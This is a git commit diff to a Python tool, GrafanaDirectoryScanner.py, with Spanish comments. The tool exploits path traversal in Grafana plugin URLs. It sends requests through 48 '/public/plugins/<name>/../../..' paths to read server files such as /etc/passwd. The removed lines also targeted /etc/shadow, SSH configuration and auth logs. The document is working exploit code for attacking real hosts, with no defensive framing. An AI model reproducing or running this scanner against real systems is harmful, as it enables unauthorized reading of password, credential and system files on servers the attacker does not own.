2dbaf70be07916a8874ed20778c0917d04ca592a
FAOG99 <92898049+FAOG99@users.noreply.github.com>
2023-05-12 11:27:59 -0600

    Update GrafanaDirectoryScanner.py

--- GrafanaDirectoryScanner.py
+++ GrafanaDirectoryScanner.py
@@ -1,73 +1,61 @@
 import http.client
 import argparse
 
-# Define los posibles archivos a buscar
-file_dict = {
-    "1": "etc/passwd",
-    "2": "etc/shadow",
-    "3": "etc/ssh/sshd_config",
-    "4": "var/log/auth.log",
-    "5": "var/www"
-}
 
 # Define la lista de directorios
 directory_list = [
-	"/public/plugins/alertGroups/../../../../../../../../",
-	"/public/plugins/alertlist/../../../../../../../../",
-	"/public/plugins/alertmanager/../../../../../../../../",
-	"/public/plugins/annolist/../../../../../../../../",
-	"/public/plugins/barchart/../../../../../../../../",
-	"/public/plugins/bargauge/../../../../../../../../",
-	"/public/plugins/canvas/../../../../../../../../",
-	"/public/plugins/cloudwatch/../../../../../../../../",
-	"/public/plugins/dashboard/../../../../../../../../",
-	"/public/plugins/dashlist/../../../../../../../../",
-	"/public/plugins/debug/../../../../../../../../",
-	"/public/plugins/elasticsearch/../../../../../../../../",
-	"/public/plugins/gauge/../../../../../../../../",
-	"/public/plugins/geomap/../../../../../../../../",
-	"/public/plugins/gettingstarted/../../../../../../../../",
-	"/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../",
-	"/public/plugins/grafana/../../../../../../../../",
-	"/public/plugins/graph/../../../../../../../../",
-	"/public/plugins/graphite/../../../../../../../../",
-	"/public/plugins/heatmap/../../../../../../../../",
-	"/public/plugins/histogram/../../../../../../../../",
-	"/public/plugins/influxdb/../../../../../../../../",
-	"/public/plugins/jaeger/../../../../../../../../",
-	"/public/plugins/live/../../../../../../../../",
-	"/public/plugins/logs/../../../../../../../../",
-	"/public/plugins/loki/../../../../../../../../",
-	"/public/plugins/mixed/../../../../../../../../",
-	"/public/plugins/mssql/../../../../../../../../",
-	"/public/plugins/mysql/../../../../../../../../",
-	"/public/plugins/news/../../../../../../../../",
-	"/public/plugins/nodeGraph/../../../../../../../../",
-	"/public/plugins/opentsdb/../../../../../../../../",
-	"/public/plugins/piechart/../../../../../../../../",
-	"/public/plugins/pluginlist/../../../../../../../../",
-	"/public/plugins/postgres/../../../../../../../../",
-	"/public/plugins/prometheus/../../../../../../../../",
-	"/public/plugins/stat/../../../../../../../../",
-	"/public/plugins/state-timeline/../../../../../../../../",
-	"/public/plugins/status-history/../../../../../../../../",
-	"/public/plugins/table-old/../../../../../../../../",
-	"/public/plugins/table/../../../../../../../../",
-	"/public/plugins/tempo/../../../../../../../../",
-	"/public/plugins/testdata/../../../../../../../../",
-	"/public/plugins/text/../../../../../../../../",
-	"/public/plugins/timeseries/../../../../../../../../",
-	"/public/plugins/welcome/../../../../../../../../",
-	"/public/plugins/xychart/../../../../../../../../",
-	"/public/plugins/zipkin/../../../../../../../../"
+	"/public/plugins/alertGroups/../../../../../../../..",
+	"/public/plugins/alertlist/../../../../../../../..",
+	"/public/plugins/alertmanager/../../../../../../../..",
+	"/public/plugins/annolist/../../../../../../../..",
+	"/public/plugins/barchart/../../../../../../../..",
+	"/public/plugins/bargauge/../../../../../../../..",
+	"/public/plugins/canvas/../../../../../../../..",
+	"/public/plugins/cloudwatch/../../../../../../../..",
+	"/public/plugins/dashboard/../../../../../../../..",
+	"/public/plugins/dashlist/../../../../../../../..",
+	"/public/plugins/debug/../../../../../../../..",
+	"/public/plugins/elasticsearch/../../../../../../../..",
+	"/public/plugins/gauge/../../../../../../../..",
+	"/public/plugins/geomap/../../../../../../../..",
+	"/public/plugins/gettingstarted/../../../../../../../..",
+	"/public/plugins/grafana-azure-monitor-datasource/../../../../../../../..",
+	"/public/plugins/grafana/../../../../../../../..",
+	"/public/plugins/graph/../../../../../../../..",
+	"/public/plugins/graphite/../../../../../../../..",
+	"/public/plugins/heatmap/../../../../../../../..",
+	"/public/plugins/histogram/../../../../../../../..",
+	"/public/plugins/influxdb/../../../../../../../..",
+	"/public/plugins/jaeger/../../../../../../../..",
+	"/public/plugins/live/../../../../../../../..",
+	"/public/plugins/logs/../../../../../../../..",
+	"/public/plugins/loki/../../../../../../../..",
+	"/public/plugins/mixed/../../../../../../../..",
+	"/public/plugins/mssql/../../../../../../../..",
+	"/public/plugins/mysql/../../../../../../../..",
+	"/public/plugins/news/../../../../../../../..",
+	"/public/plugins/nodeGraph/../../../../../../../..",
+	"/public/plugins/opentsdb/../../../../../../../..",
+	"/public/plugins/piechart/../../../../../../../..",
+	"/public/plugins/pluginlist/../../../../../../../..",
+	"/public/plugins/postgres/../../../../../../../..",
+	"/public/plugins/prometheus/../../../../../../../..",
+	"/public/plugins/stat/../../../../../../../..",
+	"/public/plugins/state-timeline/../../../../../../../..",
+	"/public/plugins/status-history/../../../../../../../..",
+	"/public/plugins/table-old/../../../../../../../..",
+	"/public/plugins/table/../../../../../../../..",
+	"/public/plugins/tempo/../../../../../../../..",
+	"/public/plugins/testdata/../../../../../../../..",
+	"/public/plugins/text/../../../../../../../..",
+	"/public/plugins/timeseries/../../../../../../../..",
+	"/public/plugins/welcome/../../../../../../../..",
+	"/public/plugins/xychart/../../../../../../../..",
+	"/public/plugins/zipkin/../../../../../../../.."
 
 ]
 
-def check_directories(domain, port, file_key):
-    file_path = file_dict.get(file_key)
-    if not file_path:
-        print(f"Opción inválida: {file_key}")
-        return
+def check_directories(domain, port, file_path="/etc/passwd"):
 
     for directory in directory_list:
         conn = http.client.HTTPConnection(domain, port)
@@ -91,14 +79,7 @@ def main():
     parser = argparse.ArgumentParser(description="Busca archivos específicos en un sitio web.")
     parser.add_argument("-d", "--domain", type=str, required=True, help="El dominio o la IP del sitio.")
     parser.add_argument("-p", "--port", type=str, required=True, help="El puerto del sitio.")
-    parser.add_argument("-f", "--files", type=str, required=True, help="""
-        Los archivos a buscar:
-        1 - /etc/passwd
-        2 - /etc/shadow
-        3 - /etc/ssh/sshd_config
-        4 - /var/log/auth.log
-        5 - /var/www
-    """)
+    parser.add_argument("-f", "--files", type=str, default="/etc/passwd", help="La ruta del archivo que deseas consultar, ejemplo: /etc/passwd")
 
     args = parser.parse_args()
 
@@ -106,4 +87,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
